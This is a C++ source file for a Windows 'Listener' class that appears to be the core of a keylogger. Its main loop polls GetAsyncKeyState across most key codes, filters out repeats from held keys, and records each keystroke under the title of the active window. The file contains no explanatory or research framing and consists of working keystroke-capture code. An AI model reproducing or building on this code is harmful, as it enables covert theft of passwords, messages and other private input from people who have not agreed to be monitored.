#include "pch.h"
#include "Listener.h"

// Listener(Logger*) : Class cunstructor
Listener::Listener(Logger* logger)
{
	this->Log = logger;
	this->Listening = false;
}

// Start() : Start listening
void Listener::Start()
{
	this->Listening = true;
	this->Run();
}

// Stop() : Stop listening
void Listener::Stop()
{
	this->Listening = false;
}

// IsListening() : Return Listener status (Listening attribut)
bool Listener::IsListening() const
{
	return Listening;
}

// Run() : Listener main loop
void Listener::Run()
{
	// Instantiate needed variables
	char key;
	char last_key = '8'; 

	// Restart Listner timer 
	this->Timer.restart();

	// Keep looping while Listening is true
	while (this->IsListening())
	{
		for (key = 8; key <= 190; ++key) // Note : intializing key at 8 
		{
			if (GetAsyncKeyState(key) == -32767) // save keyboard entree
			{
				// Prevent to add to many times a pressed and holded key
				if (key == last_key && this->Timer.getElapsedTime() <= milliseconds(100))
				{
					last_key = key;
				}
				else
				{
					// Add key to log under the window name
					Log->Add(Utilities::GetActiveWindow(), key);
					last_key = key;
					this->Timer.restart();
				}
			}
		}

		// Ease CPU
		Sleep(100);
	}

}

